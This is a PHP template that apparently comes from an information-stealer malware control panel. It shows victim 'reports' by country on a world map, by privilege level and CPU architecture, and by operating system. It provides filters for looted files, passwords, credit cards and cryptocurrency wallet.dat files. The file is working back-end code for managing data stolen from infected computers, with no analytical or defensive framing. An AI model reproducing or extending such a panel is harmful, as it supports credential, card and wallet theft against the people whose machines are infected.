<?php if(!defined("ACCESS")){exit();}?>
<script>
function filter_country(country_code){
	var i = document.getElementById('country');
	i.value = country_code;
	document.getElementById('filter_form').submit();
}

function filter_on(name_on){
	var i = document.getElementById('os');
	i.name = name_on;
	i.value = 'on';
	document.getElementById('filter_form').submit();
}

function filter_loot(loot){
	var i = document.getElementById('os');
	i.name = loot;
	i.value = 'yes';
	document.getElementById('filter_form').submit();
}
function filter_date(value){
	var i = document.getElementById('os');
	i.name = "datefrom";
	i.value = value;
	document.getElementById('filter_form').submit();
}
</script>
<div style="padding:15px;">
<div style='float: left;width:16%;'>

	Total reports: <b><?php echo htmlspecialchars($total_reports, ENT_QUOTES);?></b><br>
	<span style='cursor:pointer;' onclick='filter_date("<?php echo date("Y-m-d",strtotime("-1 day"));?>")'>24 hours: <b><?php echo htmlspecialchars($day_reports, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_date("<?php echo date("Y-m-d",strtotime("-7 day"));?>")'>7 days: <b><?php echo htmlspecialchars($week_reports, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_date("<?php echo date("Y-m-d",strtotime("-30 day"));?>")'>Month: <b><?php echo htmlspecialchars($month_reports, ENT_QUOTES);?></b></span><br>
	<br>
	<span style='cursor:pointer;' onclick='filter_on("user[admin]")'>Admin: <b><?php echo htmlspecialchars($bin_admin_count, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_on("user[user]")'>User: <b><?php echo htmlspecialchars($bin_user_count, ENT_QUOTES);?></b></span><br>
	<br>
	<span style='cursor:pointer;' onclick='filter_on("architecture[x32]")'>x32: <b><?php echo htmlspecialchars($x32_count, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_on("architecture[x64]")'>x64: <b><?php echo htmlspecialchars($x64_count, ENT_QUOTES);?></b><span><br>
	<br>
	<span style='cursor:pointer;' onclick='filter_loot("files")'>Files: <b><?php echo htmlspecialchars($reports_files, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_loot("passwords")'>Passwords: <b><?php echo htmlspecialchars($reports_pwds, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_loot("cards")'>CC: <b><?php echo htmlspecialchars($reports_cc, ENT_QUOTES);?></b></span><br>
	<span style='cursor:pointer;' onclick='filter_loot("walletdat")'>Wallet.dat: <b><?php echo htmlspecialchars($reports_crypto, ENT_QUOTES);?></b></span><br>
	Empty: <b><?php echo htmlspecialchars($reports_empty, ENT_QUOTES);?></b><br>
	No report: <b><?php echo htmlspecialchars($reports_getcfg, ENT_QUOTES);?></b><br>
	<span style='cursor:pointer;' onclick='filter_on("comment[with]")'>Comment: <b><?php echo htmlspecialchars($reports_comment, ENT_QUOTES);?></b><span><br>
	Suspicious: <b><?php echo htmlspecialchars($reports_suspicious, ENT_QUOTES);?></b><br><br>
<?php  while($row = $os_result->fetch_assoc()){ echo "<span style='cursor:pointer;' onclick='filter_on(\"osname[".get_os_post_param($row['osver'])."]\")'><b>".htmlspecialchars(get_os_nicename($row['osver']),ENT_QUOTES)."</b> : ".(int)$row['count']."</span><br>"; } ?>
</div>
<div id="world-map">
<script>
<?php
 $loadsdata = $my->query("SELECT COUNT(*) as count, country FROM reports GROUP BY country ORDER BY count DESC"); echo "var loadsData = {"; while($row = $loadsdata->fetch_assoc()){ echo "\"".htmlspecialchars($row['country'],ENT_QUOTES)."\"".":".(int)$row['count'].", "; } echo "};"; ?>
 $('#world-map').vectorMap({
	map: 'world_mill',
	backgroundColor: '#fff',
	regionStyle: {
	  initial: {
		fill: '#eee',
		"fill-opacity": 1,
		stroke: 'black',
		"stroke-width": 0.3,
		"stroke-opacity": 1,
	  },
	},
	series: {
    regions: [{
      values: loadsData,
      scale: ['#c3ddf4', '#0f1b75'],
      normalizeFunction: 'polynomial'
    }],	
  },
  	onRegionTipShow: function(e, el, code){
	  if(loadsData[code] == null){
		  loadsData[code] = 0;
	  }
      el.html(el.html()+', Loads: '+loadsData[code]);
    }
  });
</script>
</div>
<br>
<br>
<div style="" class="clearboth">
	Countries:
	<table class="country_table"><tr>
	<td valign=top>
	<?php
 $i=0; $delimiter = ceil($country_result->num_rows / 5); while($row = $country_result->fetch_assoc()){ if($i==$delimiter){ echo "</td><td valign=top>"; $i=0; } if($row['country']=="-"){$row['country']="N";} echo "<i class='flag flag-24 flag-".strtolower(htmlspecialchars($row['country'], ENT_QUOTES))." tooltip tooltip-right' data-tooltip='".htmlspecialchars($row['country'], ENT_QUOTES)."' alt='".htmlspecialchars($row['country'], ENT_QUOTES)."' style='border:1px solid black;'></i> "; echo "<span style='cursor: pointer;' onclick='filter_country(\"".htmlspecialchars($row['country'], ENT_QUOTES)."\")'>"; echo "<b>".htmlspecialchars($row['count'], ENT_QUOTES)."</b> "; echo " ".htmlspecialchars(code_to_country($row['country']), ENT_QUOTES). " </span><br>\n"; $i++; } ?>
	</td></tr></table>
	<br>
</div>
<form action="./?p=reports" method="post" id="filter_form">
<input type="hidden" name="filter" value="1337">
<input type="hidden" name="countries" value='' id='country'>
<input type="hidden" name="" value='' id='os'>
</div>
</div>